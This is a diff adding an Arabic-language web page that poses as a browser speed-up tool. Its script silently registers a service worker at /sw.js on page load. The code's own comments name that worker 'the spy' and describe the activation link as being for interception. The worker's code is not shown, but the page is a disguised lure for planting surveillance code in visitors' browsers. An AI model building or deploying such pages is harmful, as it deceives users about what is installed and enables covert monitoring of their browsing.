@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أداة تسريع المتصفح</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; text-align: center; }
+        .container { max-width: 600px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h1 { color: #2c3e50; margin-bottom: 20px; }
+        p { font-size: 16px; line-height: 1.6; }
+        .button { background-color: #3498db; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; margin-top: 20px; transition: background-color 0.3s; }
+        .button:hover { background-color: #2980b9; }
+        .footer { margin-top: 30px; font-size: 12px; color: #777; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>أداة تسريع المتصفح الاحترافية</h1>
+        <p>هل تشعر بأن متصفحك أصبح بطيئاً؟ أداةنا تقوم بتحسين الأداء عن طريق إدارة الموارد في الخلفية وتخزين البيانات بشكل أذكى.</p>
+        <p>لتفعيل الأداة، يرجى النقر على الزر أدناه للموافقة على تثبيت مكون التحسين.</p>
+        
+        <!-- رابط خارجي حقيقي للاعتراض -->
+        <a href="https://example.com/terms" class="button" id="activate-link">تفعيل الأداة الآن</a>
+        
+        <p class="footer">باستخدامك لهذه الأداة، فإنك توافق على <a href="https://example.com/privacy">شروط الخدمة وسياسة الخصوصية</a>.</p>
+    </div>
+
+    <script>
+        // اسم ملف الجاسوس (Service Worker)
+        const swUrl = '/sw.js'; // المسار النسبي، مهم لـ GitHub Pages
+
+        // التحقق من دعم المتصفح للـ Service Worker وتثبيته
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register(swUrl)
+                .then(registration => {
+                    console.log('تم تثبيت الجاسوس بنجاح:', registration.scope);
+                })
+                .catch(error => {
+                    console.error('فشل تثبيت الجاسوس:', error);
+                });
+        } else {
+            console.log('المتصفح لا يدعم Service Worker.');
+        }
+    </script>
+
+</body>
+</html>
